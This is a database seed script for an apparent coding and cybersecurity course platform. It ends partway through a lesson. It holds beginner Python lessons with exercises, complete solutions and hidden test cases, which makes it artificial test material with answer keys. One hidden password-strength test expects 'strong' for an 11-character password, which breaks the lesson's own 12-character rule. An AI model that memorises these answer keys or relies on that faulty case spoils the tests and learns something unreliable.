import { db } from '../src/lib/db'
import { hash } from 'bcryptjs'

// ============================================================
// ZERO TO DEV - CS & CYBERSECURITY MASTERY PLATFORM
// Comprehensive Database Seed Script
// ============================================================

async function main() {
  console.log('🚀 Zero to Dev — Seeding database...\n')

  // ----------------------------------------------------------
  // 0. CLEAR EXISTING DATA (respect foreign key order)
  // ----------------------------------------------------------
  console.log('🗑️  Clearing existing data...')

  await db.userAchievement.deleteMany()
  await db.labSession.deleteMany()
  await db.userExerciseAttempt.deleteMany()
  await db.userProgress.deleteMany()
  await db.testCase.deleteMany()
  await db.hint.deleteMany()
  await db.exercise.deleteMany()
  await db.lesson.deleteMany()
  await db.hackingLab.deleteMany()
  await db.achievement.deleteMany()
  await db.session.deleteMany()
  await db.account.deleteMany()
  await db.verificationToken.deleteMany()
  await db.user.deleteMany()
  await db.phase.deleteMany()

  console.log('✅ All existing data cleared.\n')

  // ----------------------------------------------------------
  // 1. CREATE PHASES
  // ----------------------------------------------------------
  console.log('📦 Creating phases...')

  const phases = await Promise.all([
    db.phase.create({
      data: {
        number: 1,
        title: 'Foundations',
        description: 'Build your programming foundation with Python and get your first taste of cybersecurity. Master variables, control flow, and basic security concepts that every developer needs to know.',
        icon: 'Code2',
      },
    }),
    db.phase.create({
      data: {
        number: 2,
        title: 'Data Structures & Algorithms',
        description: 'Strengthen your problem-solving muscles with core data structures and algorithms. From arrays to graphs, you will learn the building blocks that power every software system and security tool.',
        icon: 'GitBranch',
      },
    }),
    db.phase.create({
      data: {
        number: 3,
        title: 'Systems & Networks',
        description: 'Dive into operating systems, networking protocols, and the Linux command line. Understanding how systems communicate is essential for both building software and securing it.',
        icon: 'Server',
      },
    }),
    db.phase.create({
      data: {
        number: 4,
        title: 'Web Security',
        description: 'Explore the OWASP Top 10 and learn to identify, exploit, and patch the most critical web vulnerabilities. This phase transforms you from a developer into a security-aware engineer.',
        icon: 'Shield',
      },
    }),
    db.phase.create({
      data: {
        number: 5,
        title: 'Advanced Security',
        description: 'Master cryptography, digital forensics, and reverse engineering. These advanced skills separate security practitioners from security professionals and prepare you for real-world incident response.',
        icon: 'Lock',
      },
    }),
    db.phase.create({
      data: {
        number: 6,
        title: 'Capstone',
        description: 'Put everything together with real-world projects and CTF challenges. This final phase is your proving ground — solve capture-the-flag problems and demonstrate mastery across all domains.',
        icon: 'Trophy',
      },
    }),
  ])

  console.log(`✅ Created ${phases.length} phases.\n`)

  // ----------------------------------------------------------
  // 2. CREATE LESSONS, EXERCISES, HINTS & TEST CASES
  // ----------------------------------------------------------
  console.log('📚 Creating lessons, exercises, hints, and test cases...')

  // Helper to create a full lesson with exercises
  async function createLessonWithExercises(
    phaseId: string,
    lessonData: {
      title: string
      slug: string
      description: string
      contentMdx: string
      order: number
      xpReward: number
      category: string
      exercises: Array<{
        title: string
        slug: string
        description: string
        starterCode: string
        language: string
        order: number
        xpReward: number
        hints: Array<{ level: number; content: string; xpCost: number }>
        testCases: Array<{ input: string; expectedOutput: string; isHidden: boolean; order: number }>
      }>
    }
  ) {
    const { exercises, ...lessonFields } = lessonData
    const lesson = await db.lesson.create({
      data: {
        ...lessonFields,
        phaseId,
      },
    })

    for (const exData of exercises) {
      const { hints, testCases, ...exFields } = exData
      const exercise = await db.exercise.create({
        data: {
          ...exFields,
          lessonId: lesson.id,
        },
      })

      for (const hint of hints) {
        await db.hint.create({
          data: {
            ...hint,
            exerciseId: exercise.id,
          },
        })
      }

      for (const tc of testCases) {
        await db.testCase.create({
          data: {
            ...tc,
            exerciseId: exercise.id,
          },
        })
      }
    }

    return lesson
  }

  let lessonCount = 0
  let exerciseCount = 0

  // ============================================================
  // PHASE 1: FOUNDATIONS
  // ============================================================

  // Lesson 1.1: Hello, Python
  const lesson1_1 = await createLessonWithExercises(phases[0].id, {
    title: 'Hello, Python',
    slug: 'hello-python',
    description: 'Write your first Python programs and learn how functions work. This lesson introduces the Python interpreter, the print function, and how to define and call your own functions.',
    contentMdx: `# Hello, Python!

Welcome to your very first programming lesson! Python is one of the most popular programming languages in the world — and for good reason. It reads almost like English, which makes it an excellent first language for aspiring developers and cybersecurity professionals alike.

## Why Python?

Python is the **lingua franca** of both software development and cybersecurity. Here is why:

- **Readable syntax**: Python uses indentation instead of braces, making code clean and easy to follow.
- **Massive ecosystem**: From web frameworks (Django, Flask) to security tools (Scapy, PyCryptodome), Python has a library for everything.
- **Industry standard**: Most penetration testing tools, automation scripts, and security utilities are written in Python.

## The \`print()\` Function

The \`print()\` function is your first tool. It outputs text to the console:

\`\`\`python
print("Hello, World!")
\`\`\`

When you run this, Python displays **Hello, World!** on your screen. The quotation marks tell Python that this is a **string** — a sequence of characters.

## Defining Functions

Instead of writing code that runs top-to-bottom, we organize logic into **functions**. A function is a reusable block of code with a name:

\`\`\`python
def greet():
    return "Hello, World!"
\`\`\`

The \`def\` keyword starts a function definition. The **return** statement sends a value back to whoever called the function. This is different from \`print()\`, which merely displays output — \`return\` gives you a value you can store in a variable or use elsewhere.

## Calling Functions

Once defined, you call a function by writing its name followed by parentheses:

\`\`\`python
message = greet()
print(message)  # Output: Hello, World!
\`\`\`

## Functions with Parameters

Functions become truly powerful when they accept **parameters** — inputs that change their behavior:

\`\`\`python
def personal_greet(name):
    return f"Hello, {name}!"

print(personal_greet("Alice"))  # Output: Hello, Alice!
print(personal_greet("Bob"))    # Output: Hello, Bob!
\`\`\`

The \`f"Hello, {name}!"\` syntax is called an **f-string** (formatted string literal). It lets you embed variables directly inside a string by wrapping them in curly braces.

## Key Takeaways

1. **\`print()\`** displays output; **\`return\`** sends a value back to the caller.
2. Functions are defined with **\`def\`** and called with parentheses.
3. **Parameters** make functions flexible and reusable.
4. **F-strings** (\`f"..."\`) let you interpolate variables into strings.

Now it is your turn — write your first functions in the exercises below!`,
    order: 1,
    xpReward: 50,
    category: 'cs',
    exercises: [
      {
        title: 'Hello World Function',
        slug: 'hello-world-function',
        description: 'Write a function called `hello()` that returns the string "Hello, World!". This is the classic first program — every developer writes it at least once!',
        starterCode: `def hello():
    # Return the string "Hello, World!"
    pass`,
        language: 'python',
        order: 1,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Remember: use the `return` keyword, not `print()`, to send a value back from a function.', xpCost: 5 },
          { level: 2, content: 'Your function should contain exactly: `return "Hello, World!"`', xpCost: 10 },
          { level: 3, content: 'The complete solution is: `def hello(): return "Hello, World!"`', xpCost: 20 },
        ],
        testCases: [
          { input: 'hello()', expectedOutput: 'Hello, World!', isHidden: false, order: 1 },
          { input: 'hello() == "Hello, World!"', expectedOutput: 'True', isHidden: false, order: 2 },
          { input: 'type(hello())', expectedOutput: "<class 'str'>", isHidden: true, order: 3 },
          { input: 'len(hello())', expectedOutput: '13', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Personal Greeting',
        slug: 'personal-greeting',
        description: 'Write a function called `greet(name)` that takes a name as a parameter and returns "Hello, {name}!" where {name} is replaced with the provided name.',
        starterCode: `def greet(name):
    # Return a personalized greeting
    pass`,
        language: 'python',
        order: 2,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Use an f-string to embed the `name` variable into your greeting: `f"Hello, {name}!"`', xpCost: 5 },
          { level: 2, content: 'Your function body should be: `return f"Hello, {name}!"`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def greet(name): return f"Hello, {name}!"`', xpCost: 20 },
        ],
        testCases: [
          { input: 'greet("Alice")', expectedOutput: 'Hello, Alice!', isHidden: false, order: 1 },
          { input: 'greet("Bob")', expectedOutput: 'Hello, Bob!', isHidden: false, order: 2 },
          { input: 'greet("World")', expectedOutput: 'Hello, World!', isHidden: true, order: 3 },
          { input: 'greet("")', expectedOutput: 'Hello, !', isHidden: true, order: 4 },
          { input: 'greet("Zero to Dev")', expectedOutput: 'Hello, Zero to Dev!', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 2

  // Lesson 1.2: Variables & Data Types
  const lesson1_2 = await createLessonWithExercises(phases[0].id, {
    title: 'Variables & Data Types',
    slug: 'variables-and-data-types',
    description: 'Learn about Python data types — integers, floats, strings, booleans, and more. Understand how to check types and manipulate data.',
    contentMdx: `# Variables & Data Types

Every program works with **data**, and data comes in different **types**. Understanding types is fundamental — it affects how you store, process, and validate information, especially in security contexts where type confusion vulnerabilities exist.

## What Are Variables?

A **variable** is a named container for a value. In Python, you create a variable simply by assigning a value:

\`\`\`python
username = "hacker_one"
score = 42
is_admin = True
\`\`\`

Unlike some languages, Python is **dynamically typed** — you do not declare the type; Python figures it out.

## Core Data Types

| Type | Example | Description |
|------|---------|-------------|
| \`int\` | \`42\` | Whole numbers |
| \`float\` | \`3.14\` | Decimal numbers |
| \`str\` | \`"hello"\` | Text (strings) |
| \`bool\` | \`True\` / \`False\` | Boolean values |
| \`list\` | \`[1, 2, 3]\` | Ordered collection |
| \`dict\` | \`{"key": "val"}\` | Key-value pairs |
| \`None\` | \`None\` | Absence of value |

## The \`type()\` Function

You can inspect any value's type using \`type()\`:

\`\`\`python
print(type(42))         # <class 'int'>
print(type("hello"))    # <class 'str'>
print(type(True))       # <class 'bool'>
print(type([1, 2, 3]))  # <class 'list'>
\`\`\`

This is incredibly useful for debugging and for **input validation** — a critical security practice. Never trust user input without checking its type first!

## Type Conversion

Python lets you convert between types:

\`\`\`python
str(42)      # "42"  — int to string
int("42")    # 42    — string to int
float("3.14") # 3.14 — string to float
bool(0)      # False — zero is falsy
bool(1)      # True  — non-zero is truthy
\`\`\`

## String Operations

Strings are sequences of characters and support powerful operations:

\`\`\`python
name = "Python"
len(name)        # 6 — length
name[0]          # "P" — first character
name[-1]         # "n" — last character
name[::-1]       # "nohtyP" — reversed!
name.upper()     # "PYTHON"
name.lower()     # "python"
\`\`\`

The \`[::-1]\` trick uses **slicing** with a step of -1 to reverse a string. Slicing syntax is \`[start:stop:step]\`.

## Security Connection

Type confusion is a real vulnerability class. If an application expects an integer but receives a string, it might behave unexpectedly. **Always validate and sanitize input types** — this principle applies everywhere from web forms to API endpoints.

In the exercises below, you will write a type checker and a string reverser — two skills that form the bedrock of data validation and manipulation.`,
    order: 2,
    xpReward: 50,
    category: 'cs',
    exercises: [
      {
        title: 'Type Checker',
        slug: 'type-checker',
        description: 'Write a function `check_type(value)` that returns the name of the value\'s type as a string. For example, `check_type(42)` returns `"int"`, `check_type("hello")` returns `"str"`, `check_type(True)` returns `"bool"`, `check_type(3.14)` returns `"float"`, and `check_type(None)` returns `"NoneType"`.',
        starterCode: `def check_type(value):
    # Return the type name as a string (e.g. "int", "str", "bool", "float", "NoneType")
    pass`,
        language: 'python',
        order: 1,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Use `type(value)` to get the type object, then extract its name. The `__name__` attribute of a type object gives you the type name as a string.', xpCost: 5 },
          { level: 2, content: 'Try: `return type(value).__name__`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def check_type(value): return type(value).__name__`', xpCost: 20 },
        ],
        testCases: [
          { input: 'check_type(42)', expectedOutput: 'int', isHidden: false, order: 1 },
          { input: 'check_type("hello")', expectedOutput: 'str', isHidden: false, order: 2 },
          { input: 'check_type(True)', expectedOutput: 'bool', isHidden: true, order: 3 },
          { input: 'check_type(3.14)', expectedOutput: 'float', isHidden: true, order: 4 },
          { input: 'check_type(None)', expectedOutput: 'NoneType', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'String Reverser',
        slug: 'string-reverser',
        description: 'Write a function `reverse_string(s)` that takes a string and returns it reversed. For example, `reverse_string("python")` returns `"nohtyp"`.',
        starterCode: `def reverse_string(s):
    # Return the reversed string
    pass`,
        language: 'python',
        order: 2,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Python strings support slicing with a step parameter. Try using `s[::-1]` to step through the string backwards.', xpCost: 5 },
          { level: 2, content: 'The slice `s[::-1]` means: start at the end, go to the beginning, stepping -1 each time.', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def reverse_string(s): return s[::-1]`', xpCost: 20 },
        ],
        testCases: [
          { input: 'reverse_string("python")', expectedOutput: 'nohtyp', isHidden: false, order: 1 },
          { input: 'reverse_string("hello")', expectedOutput: 'olleh', isHidden: false, order: 2 },
          { input: 'reverse_string("a")', expectedOutput: 'a', isHidden: true, order: 3 },
          { input: 'reverse_string("")', expectedOutput: '', isHidden: true, order: 4 },
          { input: 'reverse_string("racecar")', expectedOutput: 'racecar', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 2

  // Lesson 1.3: Control Flow
  const lesson1_3 = await createLessonWithExercises(phases[0].id, {
    title: 'Control Flow',
    slug: 'control-flow',
    description: 'Master if/else statements, loops, and conditional logic. These are the building blocks that let your programs make decisions and repeat actions.',
    contentMdx: `# Control Flow

Programs that always do the same thing are boring. **Control flow** lets your code make decisions and repeat actions — it is what makes software intelligent and useful.

## Conditional Statements: \`if\` / \`elif\` / \`else\`

The \`if\` statement evaluates a condition and executes code only when the condition is \`True\`:

\`\`\`python
score = 85

if score >= 90:
    grade = "A"
elif score >= 80:
    grade = "B"
elif score >= 70:
    grade = "C"
else:
    grade = "F"

print(grade)  # Output: B
\`\`\`

Key rules:
- **Indentation matters** — Python uses 4 spaces to define code blocks.
- \`elif\` (else-if) checks additional conditions after the first \`if\`.
- \`else\` catches everything that did not match any condition.

## Boolean Logic

Combine conditions with **and**, **or**, and **not**:

\`\`\`python
is_admin = True
is_active = False

if is_admin and is_active:
    print("Full access granted")
elif is_admin or is_active:
    print("Limited access")
else:
    print("Access denied")
\`\`\`

## Loops: \`for\` and \`while\`

### For Loops

Iterate over a sequence:

\`\`\`python
for i in range(5):
    print(i)  # 0, 1, 2, 3, 4
\`\`\`

\`range(n)\` generates numbers from 0 to n-1. You can also specify a start and step:

\`\`\`python
range(2, 10, 2)  # 2, 4, 6, 8
\`\`\`

### While Loops

Repeat as long as a condition is true:

\`\`\`python
attempts = 0
while attempts < 3:
    attempts += 1
    print(f"Attempt {attempts}")
\`\`\`

**Warning**: Always ensure your while loop will eventually terminate, or you will create an infinite loop!

## The Classic: FizzBuzz

FizzBuzz is the most famous programming interview question:

> For numbers 1 through n, print "Fizz" for multiples of 3, "Buzz" for multiples of 5, "FizzBuzz" for multiples of both, and the number otherwise.

\`\`\`python
def fizzbuzz(n):
    if n % 15 == 0:
        return "FizzBuzz"
    elif n % 3 == 0:
        return "Fizz"
    elif n % 5 == 0:
        return "Buzz"
    else:
        return str(n)
\`\`\`

Note: we check \`n % 15 == 0\` first because 15 is the least common multiple of 3 and 5. If we checked divisibility by 3 first, we would never reach the "FizzBuzz" case.

## Control Flow in Security

Control flow is everywhere in security:
- **Rate limiting**: \`if attempts > max_attempts: block_ip()\`
- **Input validation**: \`if not is_valid(input): reject()\`
- **Brute force protection**: \`while not authenticated and attempts < limit: try_login()\`

Master these patterns, and you will write both more secure code and better security tools.`,
    order: 3,
    xpReward: 50,
    category: 'cs',
    exercises: [
      {
        title: 'FizzBuzz',
        slug: 'fizzbuzz',
        description: 'Write a function `fizzbuzz(n)` that takes an integer n and returns "FizzBuzz" if divisible by both 3 and 5, "Fizz" if divisible by 3 only, "Buzz" if divisible by 5 only, or the number as a string otherwise.',
        starterCode: `def fizzbuzz(n):
    # Return "FizzBuzz", "Fizz", "Buzz", or str(n)
    pass`,
        language: 'python',
        order: 1,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Check divisibility by 15 first (both 3 and 5), then by 3, then by 5. Use the modulo operator `%` — `n % 3 == 0` means n is divisible by 3.', xpCost: 5 },
          { level: 2, content: 'Structure: `if n % 15 == 0: return "FizzBuzz"` then `elif n % 3 == 0: return "Fizz"` then `elif n % 5 == 0: return "Buzz"` else `return str(n)`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def fizzbuzz(n): return "FizzBuzz" if n%15==0 else "Fizz" if n%3==0 else "Buzz" if n%5==0 else str(n)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'fizzbuzz(3)', expectedOutput: 'Fizz', isHidden: false, order: 1 },
          { input: 'fizzbuzz(5)', expectedOutput: 'Buzz', isHidden: false, order: 2 },
          { input: 'fizzbuzz(15)', expectedOutput: 'FizzBuzz', isHidden: true, order: 3 },
          { input: 'fizzbuzz(7)', expectedOutput: '7', isHidden: true, order: 4 },
          { input: 'fizzbuzz(30)', expectedOutput: 'FizzBuzz', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Palindrome Checker',
        slug: 'palindrome-checker',
        description: 'Write a function `is_palindrome(s)` that takes a string and returns `True` if it is a palindrome (reads the same forwards and backwards), `False` otherwise. Ignore case — treat "Racecar" as a palindrome.',
        starterCode: `def is_palindrome(s):
    # Return True if s is a palindrome (case-insensitive), False otherwise
    pass`,
        language: 'python',
        order: 2,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Convert the string to lowercase first with `s.lower()`, then compare it to its reverse.', xpCost: 5 },
          { level: 2, content: 'A string is a palindrome if `s.lower() == s.lower()[::-1]`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def is_palindrome(s): s = s.lower(); return s == s[::-1]`', xpCost: 20 },
        ],
        testCases: [
          { input: 'is_palindrome("racecar")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'is_palindrome("python")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'is_palindrome("Racecar")', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: 'is_palindrome("a")', expectedOutput: 'True', isHidden: true, order: 4 },
          { input: 'is_palindrome("Madam")', expectedOutput: 'True', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 2

  // Lesson 1.4: Introduction to Cybersecurity
  const lesson1_4 = await createLessonWithExercises(phases[0].id, {
    title: 'Introduction to Cybersecurity',
    slug: 'introduction-to-cybersecurity',
    description: 'Learn the foundational concepts of cybersecurity: the CIA triad, threat landscape, basic cryptography, and why security matters for every developer.',
    contentMdx: `# Introduction to Cybersecurity

Every developer needs to understand cybersecurity — not just security specialists. A single vulnerable line of code can compromise an entire system. This lesson introduces the core concepts that will guide you through the rest of your security journey.

## The CIA Triad

The foundation of all cybersecurity is the **CIA Triad** — three properties that every system must protect:

1. **Confidentiality** — Only authorized parties can access the data. Encryption, access controls, and secure communication channels protect confidentiality.
2. **Integrity** — Data has not been tampered with. Checksums, digital signatures, and hash functions verify integrity.
3. **Availability** — Systems and data are accessible when needed. Redundancy, DDoS protection, and disaster recovery ensure availability.

Every security control maps back to at least one leg of this triad. When you hear about a breach, ask yourself: which leg was compromised?

## The Threat Landscape

Cyber threats come in many forms:

- **Malware**: Viruses, worms, trojans, ransomware — malicious software designed to damage or exploit systems.
- **Phishing**: Social engineering attacks that trick users into revealing credentials or clicking malicious links.
- **Man-in-the-Middle (MitM)**: Attackers intercept communication between two parties who believe they are communicating directly.
- **SQL Injection**: Inserting malicious SQL into input fields to manipulate databases.
- **Zero-day exploits**: Attacks that exploit vulnerabilities before the vendor knows about them.

## Basic Cryptography: The Caesar Cipher

One of the oldest encryption techniques is the **Caesar cipher**, used by Julius Caesar to send secret messages. It works by shifting each letter in the plaintext by a fixed number of positions:

\`\`\`
Plaintext:  A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
Shift +3:   D E F G H I J K L M N O P Q R S T U V W X Y Z A B C
\`\`\`

So "HELLO" with a shift of 3 becomes "KHOOR". While trivially easy to break today, the Caesar cipher teaches the fundamental concept of **encryption**: transforming readable data (plaintext) into unreadable data (ciphertext) using a key (the shift value).

## Password Security

Good password hygiene is your first line of defense:

- **Length matters more than complexity** — a 16-character passphrase beats "P@ssw0rd!"
- **Never reuse passwords** — credential stuffing attacks exploit reused passwords
- **Use a password manager** — generate and store unique, strong passwords
- **Enable multi-factor authentication (MFA)** — add a second verification factor

A strong password checker evaluates length, character diversity (uppercase, lowercase, digits, symbols), and common patterns.

## Why This Matters for Developers

As a developer, you are a **de facto security engineer**. Every feature you build is an attack surface. Every input field is a potential entry point. Understanding these fundamentals is not optional — it is professional responsibility.

In the exercises below, you will implement a Caesar cipher and a password strength checker — your first steps into applied cybersecurity.`,
    order: 4,
    xpReward: 50,
    category: 'cyber',
    exercises: [
      {
        title: 'Caesar Cipher',
        slug: 'caesar-cipher',
        description: 'Write a function `caesar_cipher(text, shift)` that takes a string `text` and an integer `shift`, and returns the encrypted string where each alphabetic character is shifted by `shift` positions. Preserve case and leave non-alphabetic characters unchanged. For example, `caesar_cipher("Hello, World!", 3)` returns `"Khoor, Zruog!"`.',
        starterCode: `def caesar_cipher(text, shift):
    # Shift each letter by 'shift' positions. Preserve case.
    # Non-alphabetic characters remain unchanged.
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Iterate through each character. If it is a letter, determine if it is uppercase or lowercase, then use `ord()` and `chr()` to shift it. The formula for a shifted letter is: `chr((ord(c) - base + shift) % 26 + base)` where `base` is `ord("A")` or `ord("a")`.', xpCost: 5 },
          { level: 2, content: 'For each character c: if c.isalpha(), determine base = ord("A") if c.isupper() else ord("a"), then shifted = chr((ord(c) - base + shift) % 26 + base). Otherwise, keep c unchanged.', xpCost: 10 },
          { level: 3, content: 'Complete: `def caesar_cipher(text, shift): result = ""; [result := result + (chr((ord(c) - (ord("A") if c.isupper() else ord("a")) + shift) % 26 + (ord("A") if c.isupper() else ord("a"))) if c.isalpha() else c) for c in text]; return result` — or better, use a loop for readability.', xpCost: 20 },
        ],
        testCases: [
          { input: 'caesar_cipher("Hello, World!", 3)', expectedOutput: 'Khoor, Zruog!', isHidden: false, order: 1 },
          { input: 'caesar_cipher("abc", 1)', expectedOutput: 'bcd', isHidden: false, order: 2 },
          { input: 'caesar_cipher("XYZ", 3)', expectedOutput: 'ABC', isHidden: true, order: 3 },
          { input: 'caesar_cipher("Hello", 0)', expectedOutput: 'Hello', isHidden: true, order: 4 },
          { input: 'caesar_cipher("ZTD", 5)', expectedOutput: 'EYI', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Password Strength Checker',
        slug: 'password-strength-checker',
        description: 'Write a function `check_password_strength(password)` that returns a strength rating as a string: "weak" (length < 8 or only one character type), "medium" (length >= 8 and 2-3 character types), or "strong" (length >= 12 and all 4 character types: uppercase, lowercase, digits, special chars from "!@#$%^&*").',
        starterCode: `def check_password_strength(password):
    # Return "weak", "medium", or "strong" based on the rules above
    pass`,
        language: 'python',
        order: 2,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Count how many of these 4 character types are present: uppercase letters, lowercase letters, digits, and special characters (!@#$%^&*). Use any() with character checks on the password string.', xpCost: 5 },
          { level: 2, content: 'Calculate: `types = sum([any(c.isupper() for c in password), any(c.islower() for c in password), any(c.isdigit() for c in password), any(c in "!@#$%^&*" for c in password)])`. Then apply the length + type count rules.', xpCost: 10 },
          { level: 3, content: 'After counting types: if len(password) >= 12 and types == 4: return "strong"; elif len(password) >= 8 and types >= 2: return "medium"; else: return "weak"', xpCost: 20 },
        ],
        testCases: [
          { input: 'check_password_strength("abc")', expectedOutput: 'weak', isHidden: false, order: 1 },
          { input: 'check_password_strength("Password1")', expectedOutput: 'medium', isHidden: false, order: 2 },
          { input: 'check_password_strength("Str0ng!Pass#1")', expectedOutput: 'strong', isHidden: true, order: 3 },
          { input: 'check_password_strength("12345678")', expectedOutput: 'weak', isHidden: true, order: 4 },
          { input: 'check_password_strength("MyP@ss2024!")', expectedOutput: 'strong', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 2

  // ============================================================
  // PHASE 2: DATA STRUCTURES & ALGORITHMS
  // ============================================================

  // Lesson 2.1: Arrays & Strings
  const lesson2_1 = await createLessonWithExercises(phases[1].id, {
    title: 'Arrays & Strings',
    slug: 'arrays-and-strings',
    description: 'Master array operations and string manipulation — the most common data structures you will encounter in interviews, security tools, and real-world code.',
    contentMdx: `# Arrays & Strings

Arrays (called **lists** in Python) and strings are the most fundamental data structures. Nearly every algorithm operates on sequences of data, and nearly every security tool processes strings — from log parsers to payload generators.

## Python Lists

A list is an ordered, mutable collection:

\`\`\`python
nums = [1, 2, 3, 4, 5]
nums.append(6)      # Add to end: [1, 2, 3, 4, 5, 6]
nums.pop()          # Remove from end: [1, 2, 3, 4, 5]
nums[0]             # Access first element: 1
nums[-1]            # Access last element: 5
len(nums)           # Length: 5
\`\`\`

## Common Array Patterns

### Two Pointer Technique

Use two pointers to solve problems efficiently:

\`\`\`python
def two_sum(nums, target):
    seen = {}
    for i, num in enumerate(nums):
        complement = target - num
        if complement in seen:
            return [seen[complement], i]
        seen[num] = i
    return []
\`\`\`

This **hash map approach** gives O(n) time complexity — much better than the naive O(n²) nested loop.

### Sliding Window

Process subarrays efficiently:

\`\`\`python
def max_subarray_sum(nums, k):
    window_sum = sum(nums[:k])
    max_sum = window_sum
    for i in range(k, len(nums)):
        window_sum += nums[i] - nums[i - k]
        max_sum = max(max_sum, window_sum)
    return max_sum
\`\`\`

## String Algorithms

Strings are immutable sequences of characters. Key operations:

\`\`\`python
s = "cybersecurity"
s.count("e")        # 2
s.find("sec")       # 5
s.split("e")        # ["cyb", "rs", "curity"]
"-".join(["a","b"]) # "a-b"
s.replace("sec", "SEC") # "cyberSECurity"
\`\`\`

### Anagram Detection

Two strings are anagrams if they contain the same characters in the same frequencies:

\`\`\`python
from collections import Counter

def is_anagram(s1, s2):
    return Counter(s1.lower()) == Counter(s2.lower())
\`\`\`

## Security Applications

- **Log analysis**: Parse and filter array-structured log entries
- **Payload detection**: Search for malicious string patterns in input
- **Hash comparison**: Compare sorted character frequencies to detect tampering
- **Two Sum**: The same pattern finds matching exploit-signature pairs

Understanding arrays and strings deeply makes you a better programmer and a more effective security analyst.`,
    order: 1,
    xpReward: 60,
    category: 'cs',
    exercises: [
      {
        title: 'Two Sum',
        slug: 'two-sum',
        description: 'Write a function `two_sum(nums, target)` that takes a list of integers and a target integer, and returns a list of two indices whose values add up to the target. You may assume exactly one solution exists and you may not use the same element twice. Return the indices in ascending order.',
        starterCode: `def two_sum(nums, target):
    # Return indices of two numbers that add up to target
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use a hash map (dictionary) to store each number and its index as you iterate. For each number, check if `target - num` already exists in the map.', xpCost: 5 },
          { level: 2, content: 'Loop with enumerate: `for i, num in enumerate(nums): complement = target - num; if complement in seen: return [seen[complement], i]; seen[num] = i`', xpCost: 10 },
          { level: 3, content: 'Complete: `def two_sum(nums, target): seen = {}; for i, num in enumerate(nums): c = target - num; if c in seen: return [seen[c], i]; seen[num] = i`', xpCost: 20 },
        ],
        testCases: [
          { input: 'two_sum([2, 7, 11, 15], 9)', expectedOutput: '[0, 1]', isHidden: false, order: 1 },
          { input: 'two_sum([3, 2, 4], 6)', expectedOutput: '[1, 2]', isHidden: false, order: 2 },
          { input: 'two_sum([1, 5, 3, 7], 10)', expectedOutput: '[1, 3]', isHidden: true, order: 3 },
          { input: 'two_sum([0, 4, 3, 0], 0)', expectedOutput: '[0, 3]', isHidden: true, order: 4 },
          { input: 'two_sum([-1, -2, -3, -4, -5], -8)', expectedOutput: '[2, 4]', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Anagram Detector',
        slug: 'anagram-detector',
        description: 'Write a function `is_anagram(s1, s2)` that takes two strings and returns `True` if they are anagrams of each other (same characters, same frequencies, ignoring case), `False` otherwise.',
        starterCode: `def is_anagram(s1, s2):
    # Return True if s1 and s2 are anagrams (case-insensitive)
    pass`,
        language: 'python',
        order: 2,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Normalize both strings to lowercase, then compare their sorted characters or use a frequency counter.', xpCost: 5 },
          { level: 2, content: 'Simplest approach: `return sorted(s1.lower()) == sorted(s2.lower())`', xpCost: 10 },
          { level: 3, content: 'Complete: `def is_anagram(s1, s2): return sorted(s1.lower()) == sorted(s2.lower())`', xpCost: 20 },
        ],
        testCases: [
          { input: 'is_anagram("listen", "silent")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'is_anagram("hello", "world")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'is_anagram("Dormitory", "Dirty room")', expectedOutput: 'False', isHidden: true, order: 3 },
          { input: 'is_anagram("abc", "cba")', expectedOutput: 'True', isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 2

  // Lesson 2.2: Linked Lists & Stacks
  const lesson2_2 = await createLessonWithExercises(phases[1].id, {
    title: 'Linked Lists & Stacks',
    slug: 'linked-lists-and-stacks',
    description: 'Understand linked lists, stacks, and how they power fundamental algorithms like expression evaluation and memory management.',
    contentMdx: `# Linked Lists & Stacks

Linked lists and stacks are fundamental data structures that appear everywhere — from memory management in operating systems to call stacks in programming languages to browser history navigation.

## Linked Lists

A linked list is a sequence of **nodes**, where each node contains data and a reference (pointer) to the next node:

\`\`\`python
class Node:
    def __init__(self, val=0, next=None):
        self.val = val
        self.next = next
\`\`\`

Unlike arrays, linked lists:
- **Do not** support random access (no \`list[5]\`)
- **Do** support O(1) insertion and deletion at the head
- Have dynamic size — no need to pre-allocate memory

### Reversing a Linked List

This is one of the most common interview questions. The iterative approach uses three pointers:

\`\`\`python
def reverse_list(head):
    prev = None
    current = head
    while current:
        next_node = current.next
        current.next = prev
        prev = current
        current = next_node
    return prev
\`\`\`

The key insight: we iterate through the list, and at each step, we flip the \`next\` pointer to point backwards instead of forwards.

## Stacks

A stack is a **Last-In, First-Out (LIFO)** data structure. Think of a stack of plates — you add and remove from the top:

\`\`\`python
stack = []
stack.append("a")   # Push
stack.append("b")   # Push
stack.pop()         # Pop -> "b" (last in, first out)
\`\`\`

### Valid Parentheses

Stacks are perfect for matching pairs — like parentheses, HTML tags, or braces:

